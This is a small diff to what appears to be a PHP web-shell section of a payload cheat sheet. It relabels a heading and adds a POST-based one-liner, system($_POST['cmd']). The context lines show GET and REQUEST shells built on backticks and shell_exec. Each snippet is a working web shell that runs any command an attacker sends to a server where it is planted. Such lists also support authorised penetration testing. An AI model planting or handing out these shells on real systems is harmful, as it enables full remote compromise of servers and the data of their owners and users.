@@ -246,7 +246,7 @@
   
   # <kbd>PHP WebShell</kbd>
   
-  # <kbd>Basic</kbd>
+  # <kbd>GET</kbd>
   
   ```php
   <?=`$_GET[cmd]`?>
@@ -287,6 +287,12 @@
   ```php
   
   <?php echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>"; ?>
+  ```
+  
+  # <kbd>POST</kbd>
+  
+  ```php
+  <?php system($_POST['cmd']); ?>
   ```
   
   ---
